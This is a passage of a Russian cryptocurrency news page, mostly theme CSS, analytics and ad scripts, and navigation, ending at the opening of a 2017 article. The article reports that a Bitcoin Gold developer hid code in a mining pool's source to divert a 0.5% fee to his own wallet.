+    .td-post-small-box a:hover,
+    .td-404-sub-sub-title a:hover,
+    .td-rating-bar-wrap div,
+    .td_top_authors .td-active .td-author-post-count,
+    .td_top_authors .td-active .td-author-comments-count,
+    .td_smart_list_3 .td-sml3-top-controls i:hover,
+    .td_smart_list_3 .td-sml3-bottom-controls i:hover,
+    .td_wrapper_video_playlist .td_video_controls_playlist_wrapper,
+    .td-read-more a:hover,
+    .td-login-wrap .btn,
+    .td_display_err,
+    .td-header-style-6 .td-top-menu-full,
+    #bbpress-forums button:hover,
+    #bbpress-forums .bbp-pagination .current,
+    .bbp_widget_login .button:hover,
+    .header-search-wrap .td-drop-down-search .btn:hover,
+    .td-post-text-content .more-link-wrap:hover a,
+    #buddypress div.item-list-tabs ul li > a span,
+    #buddypress div.item-list-tabs ul li > a:hover span,
+    #buddypress input[type=submit]:hover,
+    #buddypress a.button:hover span,
+    #buddypress div.item-list-tabs ul li.selected a span,
+    #buddypress div.item-list-tabs ul li.current a span,
+    #buddypress input[type=submit]:focus,
+    .td-grid-style-3 .td-big-grid-post .td-module-thumb a:last-child:before,
+    .td-grid-style-4 .td-big-grid-post .td-module-thumb a:last-child:before,
+    .td-grid-style-5 .td-big-grid-post .td-module-thumb:after,
+    .td_category_template_2 .td-category-siblings .td-category a:hover,
+    .td-weather-week:before,
+    .td-weather-information:before,
+     .td_3D_btn,
+    .td_shadow_btn,
+    .td_default_btn,
+    .td_square_btn, 
+    .td_outlined_btn:hover {
+        background-color: #dd9933;
+    }
+
+    @media (max-width: 767px) {
+        .td-category a.td-current-sub-category {
+            background-color: #dd9933;
+        }
+    }
+
+    .woocommerce .onsale,
+    .woocommerce .woocommerce a.button:hover,
+    .woocommerce-page .woocommerce .button:hover,
+    .single-product .product .summary .cart .button:hover,
+    .woocommerce .woocommerce .product a.button:hover,
+    .woocommerce .product a.button:hover,
+    .woocommerce .product #respond input#submit:hover,
+    .woocommerce .checkout input#place_order:hover,
+    .woocommerce .woocommerce.widget .button:hover,
+    .woocommerce .woocommerce-message .button:hover,
+    .woocommerce .woocommerce-error .button:hover,
+    .woocommerce .woocommerce-info .button:hover,
+    .woocommerce.widget .ui-slider .ui-slider-handle,
+    .vc_btn-black:hover,
+	.wpb_btn-black:hover,
+	.item-list-tabs .feed:hover a,
+	.td-smart-list-button:hover {
+    	background-color: #dd9933 !important;
+    }
+
+    .td-header-sp-top-menu .top-header-menu > .current-menu-item > a,
+    .td-header-sp-top-menu .top-header-menu > .current-menu-ancestor > a,
+    .td-header-sp-top-menu .top-header-menu > .current-category-ancestor > a,
+    .td-header-sp-top-menu .top-header-menu > li > a:hover,
+    .td-header-sp-top-menu .top-header-menu > .sfHover > a,
+    .top-header-menu ul .current-menu-item > a,
+    .top-header-menu ul .current-menu-ancestor > a,
+    .top-header-menu ul .current-category-ancestor > a,
+    .top-header-menu ul li > a:hover,
+    .top-header-menu ul .sfHover > a,
+    .sf-menu ul .td-menu-item > a:hover,
+    .sf-menu ul .sfHover > a,
+    .sf-menu ul .current-menu-ancestor > a,
+    .sf-menu ul .current-category-ancestor > a,
+    .sf-menu ul .current-menu-item > a,
+    .td_module_wrap:hover .entry-title a,
+    .td_mod_mega_menu:hover .entry-title a,
+    .footer-email-wrap a,
+    .widget a:hover,
+    .td-footer-container .widget_calendar #today,
+    .td-category-pulldown-filter a.td-pulldown-category-filter-link:hover,
+    .td-load-more-wrap a:hover,
+    .td-post-next-prev-content a:hover,
+    .td-author-name a:hover,
+    .td-author-url a:hover,
+    .td_mod_related_posts:hover .entry-title a,
+    .td-search-query,
+    .header-search-wrap .td-drop-down-search .result-msg a:hover,
+    .td_top_authors .td-active .td-authors-name a,
+    .post blockquote p,
+    .td-post-content blockquote p,
+    .page blockquote p,
+    .comment-list cite a:hover,
+    .comment-list cite:hover,
+    .comment-list .comment-reply-link:hover,
+    a,
+    .white-menu #td-header-menu .sf-menu > li > a:hover,
+    .white-menu #td-header-menu .sf-menu > .current-menu-ancestor > a,
+    .white-menu #td-header-menu .sf-menu > .current-menu-item > a,
+    .td_quote_on_blocks,
+    #bbpress-forums .bbp-forum-freshness a:hover,
+    #bbpress-forums .bbp-topic-freshness a:hover,
+    #bbpress-forums .bbp-forums-list li a:hover,
+    #bbpress-forums .bbp-forum-title:hover,
+    #bbpress-forums .bbp-topic-permalink:hover,
+    #bbpress-forums .bbp-topic-started-by a:hover,
+    #bbpress-forums .bbp-topic-started-in a:hover,
+    #bbpress-forums .bbp-body .super-sticky li.bbp-topic-title .bbp-topic-permalink,
+    #bbpress-forums .bbp-body .sticky li.bbp-topic-title .bbp-topic-permalink,
+    #bbpress-forums #subscription-toggle a:hover,
+    #bbpress-forums #favorite-toggle a:hover,
+    .woocommerce-account .woocommerce-MyAccount-navigation a:hover,
+    .widget_display_replies .bbp-author-name,
+    .widget_display_topics .bbp-author-name,
+    .archive .widget_archive .current,
+    .archive .widget_archive .current a,
+    .td-subcategory-header .td-category-siblings .td-subcat-dropdown a.td-current-sub-category,
+    .td-subcategory-header .td-category-siblings .td-subcat-dropdown a:hover,
+    .td-pulldown-filter-display-option:hover,
+    .td-pulldown-filter-display-option .td-pulldown-filter-link:hover,
+    .td_normal_slide .td-wrapper-pulldown-filter .td-pulldown-filter-list a:hover,
+    #buddypress ul.item-list li div.item-title a:hover,
+    .td_block_13 .td-pulldown-filter-list a:hover,
+    .td_smart_list_8 .td-smart-list-dropdown-wrap .td-smart-list-button:hover,
+    .td_smart_list_8 .td-smart-list-dropdown-wrap .td-smart-list-button:hover i,
+    .td-sub-footer-container a:hover,
+    .td-instagram-user a,
+     .td_outlined_btn {
+        color: #dd9933;
+    }
+
+    .td-mega-menu .wpb_content_element li a:hover,
+    .td_login_tab_focus {
+        color: #dd9933 !important;
+    }
+
+    .td-next-prev-wrap a:hover i,
+    .page-nav .current,
+    .widget_tag_cloud a:hover,
+    .post .td_quote_box,
+    .page .td_quote_box,
+    .td-login-panel-title,
+    #bbpress-forums .bbp-pagination .current,
+    .td_category_template_2 .td-category-siblings .td-category a:hover,
+    .page-template-page-pagebuilder-latest .td-instagram-user,
+     .td_outlined_btn {
+        border-color: #dd9933;
+    }
+
+    .td_wrapper_video_playlist .td_video_currently_playing:after,
+    .item-list-tabs .feed:hover {
+        border-color: #dd9933 !important;
+    }
+
+
+    
+    .td-pb-row [class*="td-pb-span"],
+    .td-pb-border-top,
+    .page-template-page-title-sidebar-php .td-page-content > .wpb_row:first-child,
+    .td-post-sharing,
+    .td-post-content,
+    .td-post-next-prev,
+    .author-box-wrap,
+    .td-comments-title-wrap,
+    .comment-list,
+    .comment-respond,
+    .td-post-template-5 header,
+    .td-container,
+    .wpb_content_element,
+    .wpb_column,
+    .wpb_row,
+    .white-menu .td-header-container .td-header-main-menu,
+    .td-post-template-1 .td-post-content,
+    .td-post-template-4 .td-post-sharing-top,
+    .td-header-style-6 .td-header-header .td-make-full,
+    #disqus_thread,
+    .page-template-page-pagebuilder-title-php .td-page-content > .wpb_row:first-child,
+    .td-footer-container:before {
+        border-color: #dd9933;
+    }
+    .td-top-border {
+        border-color: #dd9933 !important;
+    }
+    .td-container-border:after,
+    .td-next-prev-separator,
+    .td-container .td-pb-row .wpb_column:before,
+    .td-container-border:before,
+    .td-main-content:before,
+    .td-main-sidebar:before,
+    .td-pb-row .td-pb-span4:nth-of-type(3):after,
+    .td-pb-row .td-pb-span4:nth-last-of-type(3):after {
+    	background-color: #dd9933;
+    }
+    @media (max-width: 767px) {
+    	.white-menu .td-header-main-menu {
+      		border-color: #dd9933;
+      	}
+    }
+
+
+
+    
+    .td-header-top-menu,
+    .td-header-wrap .td-top-menu-full {
+        background-color: #080fd3;
+    }
+
+    .td-header-style-1 .td-header-top-menu,
+    .td-header-style-2 .td-top-bar-container,
+    .td-header-style-7 .td-header-top-menu {
+        padding: 0 12px;
+        top: 0;
+    }
+
+    
+    .td-header-main-menu {
+        background-color: #080fd3;
+    }
+
+    
+    .td-header-border:before {
+        background-color: #dd9933;
+    }
+
+    
+    .td-header-row.td-header-header {
+        background-color: #080fd3;
+    }
+
+    .td-header-style-1 .td-header-top-menu {
+        padding: 0 12px;
+    	top: 0;
+    }
+
+    @media (min-width: 1024px) {
+    	.td-header-style-1 .td-header-header {
+      		padding: 0 6px;
+      	}
+    }
+
+    .td-header-style-6 .td-header-header .td-make-full {
+    	border-bottom: 0;
+    }
+
+
+    @media (max-height: 768px) {
+        .td-header-style-6 .td-header-sp-rec {
+            margin-right: 7px;
+        }
+        .td-header-style-6 .td-header-sp-logo {
+        	margin-left: 7px;
+    	}
+    }
+
+    
+    .td-menu-background:before,
+    .td-search-background:before {
+        background: #dd9933;
+        background: -moz-linear-gradient(top, #dd9933 0%, #b8333e 100%);
+        background: -webkit-gradient(left top, left bottom, color-stop(0%, #dd9933), color-stop(100%, #b8333e));
+        background: -webkit-linear-gradient(top, #dd9933 0%, #b8333e 100%);
+        background: -o-linear-gradient(top, #dd9933 0%, @mobileu_gradient_two_mob 100%);
+        background: -ms-linear-gradient(top, #dd9933 0%, #b8333e 100%);
+        background: linear-gradient(to bottom, #dd9933 0%, #b8333e 100%);
+        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#dd9933', endColorstr='#b8333e', GradientType=0 );
+    }
+
+    
+    .td-footer-container,
+    .td-footer-container .td_module_mx3 .meta-info,
+    .td-footer-container .td_module_14 .meta-info,
+    .td-footer-container .td_module_mx1 .td-block14-border {
+        background-color: #080fd3;
+    }
+    .td-footer-container .widget_calendar #today {
+    	background-color: transparent;
+    }
+
+    
+    .td-sub-footer-container {
+        background-color: #dd9933;
+    }
+    .td-sub-footer-container:after {
+        background-color: transparent;
+    }
+    .td-sub-footer-container:before {
+        background-color: transparent;
+    }
+    .td-footer-container.td-container {
+        border-bottom-width: 0;
+    }
+
+    
+    .td-subfooter-menu li a:hover {
+        color: #ffffff;
+    }
+
+    
+    .td_module_1 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_2 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_3 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_4 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_5 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_6 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_7 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_8 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_9 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_10 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_11 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_12 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_13 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_14 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_15 .entry-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_mx2 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_module_mx4 .td-module-title a {
+    	color: #080fd3;
+    }
+    
+    .td_block_trending_now .entry-title a {
+    	color: #080fd3;
+    }
+</style>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+    (function (d, w, c) {
+        (w[c] = w[c] || []).push(function() {
+            try {
+                w.yaCounter46109667 = new Ya.Metrika({
+                    id:46109667,
+                    clickmap:true,
+                    trackLinks:true,
+                    accurateTrackBounce:true,
+                    webvisor:true
+                });
+            } catch(e) { }
+        });
+
+        var n = d.getElementsByTagName("script")[0],
+            s = d.createElement("script"),
+            f = function () { n.parentNode.insertBefore(s, n); };
+        s.type = "text/javascript";
+        s.async = true;
+        s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+        if (w.opera == "[object Opera]") {
+            d.addEventListener("DOMContentLoaded", f, false);
+        } else { f(); }
+    })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/46109667" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter --><script type="application/ld+json">
+                        {
+                            "@context": "http://schema.org",
+                            "@type": "BreadcrumbList",
+                            "itemListElement": [{
+                            "@type": "ListItem",
+                            "position": 1,
+                                "item": {
+                                "@type": "WebSite",
+                                "@id": "http://bitcois.be/",
+                                "name": "Домой"                                               
+                            }
+                        },{
+                            "@type": "ListItem",
+                            "position": 2,
+                                "item": {
+                                "@type": "WebPage",
+                                "@id": "http://bitcois.be/mining",
+                                "name": "Майнинг"
+                            }
+                        },{
+                            "@type": "ListItem",
+                            "position": 3,
+                                "item": {
+                                "@type": "WebPage",
+                                "@id": "http://bitcois.be/mining/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html",
+                                "name": "Разработчик Bitcoin Gold встроил в код пула начисление комиссии на свой личный..."                                
+                            }
+                        }    ]
+                        }
+                       </script></head>
+
+<body class="post-template-default single single-post postid-2035 single-format-standard razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres global-block-template-1 td-animation-stack-type1 td-boxed-layout td-ad-background-link" itemscope="itemscope" itemtype="http://schema.org/WebPage">
+
+        <div class="td-scroll-up"><i class="td-icon-menu-up"></i></div>
+
+    <div class="td-menu-background"></div>
+<div id="td-mobile-nav">
+    <div class="td-mobile-container">
+        <!-- mobile menu top section -->
+        <div class="td-menu-socials-wrap">
+            <!-- socials -->
+            <div class="td-menu-socials">
+                
+        <span class="td-social-icon-wrap">
+            <a target="_blank" href="https://www.facebook.com/bitcois.be" title="Facebook">
+                <i class="td-icon-font td-icon-facebook"></i>
+            </a>
+        </span>
+        <span class="td-social-icon-wrap">
+            <a target="_blank" href="https://plus.google.com/u/0/107831586421695478064" title="Google+">
+                <i class="td-icon-font td-icon-googleplus"></i>
+            </a>
+        </span>
+        <span class="td-social-icon-wrap">
+            <a target="_blank" href="https://twitter.com/bitcoisbe" title="Twitter">
+                <i class="td-icon-font td-icon-twitter"></i>
+            </a>
+        </span>
+        <span class="td-social-icon-wrap">
+            <a target="_blank" href="#" title="VKontakte">
+                <i class="td-icon-font td-icon-vk"></i>
+            </a>
+        </span>
+        <span class="td-social-icon-wrap">
+            <a target="_blank" href="#" title="Youtube">
+                <i class="td-icon-font td-icon-youtube"></i>
+            </a>
+        </span>            </div>
+            <!-- close button -->
+            <div class="td-mobile-close">
+                <a href="#"><i class="td-icon-close-mobile"></i></a>
+            </div>
+        </div>
+
+        <!-- login section -->
+        
+        <!-- menu section -->
+        <div class="td-mobile-content">
+            <div class="menu-menu-1-container"><ul id="menu-menu-1" class="td-mobile-main-menu"><li id="menu-item-154" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-first menu-item-154"><a href="/">Главная</a></li>
+<li id="menu-item-148" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-148"><a href="http://bitcois.be/news">Новости</a></li>
+<li id="menu-item-149" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-149"><a href="http://bitcois.be/article">Статьи</a></li>
+<li id="menu-item-150" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-150"><a href="http://bitcois.be/exchange">Биржи</a></li>
+<li id="menu-item-151" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-151"><a href="http://bitcois.be/mining">Майнинг</a></li>
+<li id="menu-item-152" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-152"><a href="http://bitcois.be/market">Технологии и рынок</a></li>
+<li id="menu-item-153" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-153"><a href="#">Сервис<i class="td-icon-menu-right td-element-after"></i></a>
+<ul class="sub-menu">
+	<li id="menu-item-5405" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5405"><a href="http://bitcois.be/transactionsspeed">Ускоритель ВТС</a></li>
+	<li id="menu-item-157" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-157"><a href="http://bitcois.be/bitcoin">Bitcoin</a></li>
+	<li id="menu-item-156" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-156"><a href="http://bitcois.be/litecoin">Litecoin</a></li>
+	<li id="menu-item-155" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-155"><a href="http://bitcois.be/etherium">Etherium</a></li>
+	<li id="menu-item-897" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-897"><a href="http://bitcois.be/ripple">Ripple</a></li>
+	<li id="menu-item-781" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-781"><a href="http://bitcois.be/zcash">Zcash</a></li>
+</ul>
+</li>
+<li id="menu-item-3006" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3006"><a href="http://bitcois.be/coinmarket">Маркет</a></li>
+</ul></div>        </div>
+    </div>
+
+    <!-- register/login section -->
+    </div>    <div class="td-search-background"></div>
+<div class="td-search-wrap-mob">
+	<div class="td-drop-down-search" aria-labelledby="td-header-search-button">
+		<form method="get" class="td-search-form" action="http://bitcois.be/">
+			<!-- close button -->
+			<div class="td-search-close">
+				<a href="#"><i class="td-icon-close-mobile"></i></a>
+			</div>
+			<div role="search" class="td-search-input">
+				<span>Поиск</span>
+				<input id="td-header-search-mob" type="text" value="" name="s" autocomplete="off" />
+			</div>
+		</form>
+		<div id="td-aj-search-mob"></div>
+	</div>
+</div>
+
+    <div id="td-outer-wrap">
+    
+        <div class="td-outer-container">
+        
+            <!--
+Header style 9
+-->
+<div class="td-header-wrap td-header-style-9">
+    <div class="td-top-menu-full">
+        <div class="td-header-row td-header-top-menu td-make-full">
+            
+    <div class="td-top-bar-container top-bar-style-1">
+        <div class="td-header-sp-top-menu">
+
+            <div class="td_data_time">
+            <div style="visibility:hidden;">
+
+                12 сентября, 2026, 17:38
+            </div>
+        </div>
+    <div class="menu-top-container"><ul id="menu-menu-2" class="top-header-menu"><li id="menu-item-164" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-first td-menu-item td-normal-menu menu-item-164"><a href="http://bitcois.be/about">О сайте</a></li>
+<li id="menu-item-162" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-162"><a href="http://bitcois.be/sitemap">Карта сайта</a></li>
+<li id="menu-item-163" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-163"><a href="http://bitcois.be/feedback">Обратная связь</a></li>
+</ul></div></div>            <div class="td-header-sp-top-widget">
+        
+        <span class="td-social-icon-wrap">
+            <a target="_blank" href="https://www.facebook.com/bitcois.be" title="Facebook">
+                <i class="td-icon-font td-icon-facebook"></i>
+            </a>
+        </span>
+        <span class="td-social-icon-wrap">
+            <a target="_blank" href="https://plus.google.com/u/0/107831586421695478064" title="Google+">
+                <i class="td-icon-font td-icon-googleplus"></i>
+            </a>
+        </span>
+        <span class="td-social-icon-wrap">
+            <a target="_blank" href="https://twitter.com/bitcoisbe" title="Twitter">
+                <i class="td-icon-font td-icon-twitter"></i>
+            </a>
+        </span>
+        <span class="td-social-icon-wrap">
+            <a target="_blank" href="#" title="VKontakte">
+                <i class="td-icon-font td-icon-vk"></i>
+            </a>
+        </span>
+        <span class="td-social-icon-wrap">
+            <a target="_blank" href="#" title="Youtube">
+                <i class="td-icon-font td-icon-youtube"></i>
+            </a>
+        </span>    </div>
+        </div>
+
+<!-- LOGIN MODAL -->
+        </div>
+    </div>
+
+    <div class="td-header-menu-wrap">
+        <div class="td-header-row td-header-border td-header-main-menu">
+            <div class="td-make-full">
+                <div id="td-header-menu" role="navigation">
+    <div id="td-top-mobile-toggle"><a href="#"><i class="td-icon-font td-icon-mobile"></i></a></div>
+    <div class="td-main-menu-logo td-logo-in-menu">
+                <a class="td-main-logo" href="http://bitcois.be/">
+            <img class="td-retina-data" data-retina="/wp-content/logo-btc.png" src="/wp-content/logo-btc.png" alt="Крипто" title="Биткоин - портал о криптовалютах"/>
+            <span class="td-visual-hidden">Биткоис</span>
+        </a>
+        </div>
+    <div class="menu-menu-1-container"><ul id="menu-menu-3" class="sf-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-first td-menu-item td-normal-menu menu-item-154"><a href="/">Главная</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-148"><a href="http://bitcois.be/news">Новости</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-149"><a href="http://bitcois.be/article">Статьи</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-150"><a href="http://bitcois.be/exchange">Биржи</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent td-menu-item td-normal-menu menu-item-151"><a href="http://bitcois.be/mining">Майнинг</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-152"><a href="http://bitcois.be/market">Технологии и рынок</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children td-menu-item td-normal-menu menu-item-153"><a href="#">Сервис</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-5405"><a href="http://bitcois.be/transactionsspeed">Ускоритель ВТС</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-157"><a href="http://bitcois.be/bitcoin">Bitcoin</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-156"><a href="http://bitcois.be/litecoin">Litecoin</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-155"><a href="http://bitcois.be/etherium">Etherium</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-897"><a href="http://bitcois.be/ripple">Ripple</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-781"><a href="http://bitcois.be/zcash">Zcash</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-3006"><a href="http://bitcois.be/coinmarket">Маркет</a></li>
+</ul></div></div>
+
+<div class="td-search-wrapper">
+    <div id="td-top-search">
+        <!-- Search -->
+        <div class="header-search-wrap">
+            <div class="dropdown header-search">
+                <a id="td-header-search-button" href="#" role="button" class="dropdown-toggle " data-toggle="dropdown"><i class="td-icon-search"></i></a>
+                <a id="td-header-search-button-mob" href="#" role="button" class="dropdown-toggle " data-toggle="dropdown"><i class="td-icon-search"></i></a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="header-search-wrap">
+	<div class="dropdown header-search">
+		<div class="td-drop-down-search" aria-labelledby="td-header-search-button">
+			<form method="get" class="td-search-form" action="http://bitcois.be/">
+				<div role="search" class="td-head-form-search-wrap">
+					<input class="needsclick" id="td-header-search" type="text" value="" name="s" autocomplete="off" /><input class="wpb_button wpb_btn-inverse btn" type="submit" id="td-header-search-top" value="Поиск" />
+				</div>
+			</form>
+			<div id="td-aj-search"></div>
+		</div>
+	</div>
+</div>            </div>
+        </div>
+    </div>
+
+    <div class="td-header-container">
+        <div class="td-header-row">
+            <div class="td-header-sp-rec">
+                
+<div class="td-header-ad-wrap  td-ad-m td-ad-tp td-ad-p">
+    
+ <!-- A generated by theme --> 
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><div class="td-g-rec td-g-rec-id-header td_uid_1_6aa563dbe02d7_rand td_block_template_1">
+<script type="text/javascript">
+var td_screen_width = document.body.clientWidth;
+
+                    if ( td_screen_width >= 1024 ) {
+                        /* large monitors */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="1996984944"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+            
+                    if ( td_screen_width >= 768  && td_screen_width < 1024 ) {
+                        /* portrait tablets */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="1996984944"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+                
+                    if ( td_screen_width < 768 ) {
+                        /* Phones */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:320px;height:50px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="1996984944"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+                </script>
+</div>
+
+ <!-- end A --> 
+
+
+
+</div>            </div>
+        </div>
+    </div>
+</div>
+    <div class="td-container td-post-template-default">
+        <div class="td-container-border">
+            <div class="td-pb-row">
+                                            <div class="td-pb-span8 td-main-content" role="main">
+                                <div class="td-ss-main-content">
+                                    
+
+    <article id="post-2035" class="post-2035 post type-post status-publish format-standard has-post-thumbnail hentry category-mining" itemscope itemtype="http://schema.org/Article">
+        <div class="td-post-header td-pb-padding-side">
+            <div class="entry-crumbs"><span><a title="" class="entry-crumb" href="http://bitcois.be/">Домой</a></span> <i class="td-icon-right td-bread-sep"></i> <span><a title="Просмотреть все посты в Майнинг" class="entry-crumb" href="http://bitcois.be/mining">Майнинг</a></span> <i class="td-icon-right td-bread-sep td-bred-no-url-last"></i> <span class="td-bred-no-url-last">Разработчик Bitcoin Gold встроил в код пула начисление комиссии на свой личный...</span></div>
+            
+            <header>
+                <h1 class="entry-title">Разработчик Bitcoin Gold встроил в код пула начисление комиссии на свой личный адрес</h1>
+
+                
+
+                <div class="meta-info">
+
+                                        <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-11-17T13:29:56+00:00" >17.11.2017</time></span>                    <div class="td-post-views"><i class="td-icon-views"></i><span class="td-nr-views-2035">935</span></div>                    <div class="td-post-comments"><a href="http://bitcois.be/mining/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html#respond"><i class="td-icon-comments"></i>0</a></div>                </div>
+            </header>
+
+
+        </div>
+
+        
+
+        <div class="td-post-content td-pb-padding-side">
+
+        
+        
+ <!-- A generated by theme --> 
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><div class="td-g-rec td-g-rec-id-content_top td_uid_3_6aa563dbe172d_rand td_block_template_1">
+<script type="text/javascript">
+var td_screen_width = document.body.clientWidth;
+
+                    if ( td_screen_width >= 1024 ) {
+                        /* large monitors */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="5577137301"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+            
+                    if ( td_screen_width >= 768  && td_screen_width < 1024 ) {
+                        /* portrait tablets */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="5577137301"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+                
+                    if ( td_screen_width < 768 ) {
+                        /* Phones */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="5577137301"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+                </script>
+</div>
+
+ <!-- end A --> 
+
+
+ <!-- A generated by theme --> 
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><div class="td-g-rec td-g-rec-id-content_inline td_uid_2_6aa563dbe16ea_rand td_block_template_1">
+<script type="text/javascript">
+var td_screen_width = document.body.clientWidth;
+
+                    if ( td_screen_width >= 1024 ) {
+                        /* large monitors */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="5421224636"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+            
+                    if ( td_screen_width >= 768  && td_screen_width < 1024 ) {
+                        /* portrait tablets */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="5421224636"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+                
+                    if ( td_screen_width < 768 ) {
+                        /* Phones */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:320px;height:50px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="5421224636"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+                </script>
+</div>
+
+ <!-- end A --> 
+
+<p><img src="/wp-content/uploads/2017/11/6c385fc0d892b7fa8256436a92363966.jpg" Разработчик Bitcoin Gold встроил в код пула начисление комиссии на свой личный адрес  /></p>
+<p>Разработчиков Bitcoin Gold снова подвергли критике, когда одним из майнеров был обнаружен встроенный протокол комиссии, скрытый в коде майнингового пула, принадлежащему одному из участников команды. Один из главных разработчиков BTG Мартин Куванджиев (StarbugBG) добавил скрытый <span id="more-2035"></span>код в исходники пула btgmine.org, что позволяло ему получать комиссию размером 0,5% непосредственно в свой личный кошелёк.</p>
